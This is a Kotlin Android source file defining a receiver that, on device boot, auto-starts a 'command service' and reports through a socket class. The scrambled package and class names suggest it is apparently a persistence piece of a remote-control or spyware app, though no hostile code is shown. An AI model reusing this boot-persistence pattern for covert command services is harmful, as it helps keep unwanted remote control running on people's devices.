package com.xxx.zzz.receiverss

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.servicesp.CommandServicedas
import com.xxx.zzz.socketsp.IOSocketyt

class BootCompletedReceiverads : BroadcastReceiver() {

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    override fun onReceive(context: Context, intent: Intent) {
        Log.d("appp", "BootCompletedReceiver Receiver")

        SharedPreferencess.init(context.applicationContext)
        CommandServicedas.autoStart(context)
        IOSocketyt.sendLogs("", "BootCompletedReceiverads: onReceive", "success")
    }
}
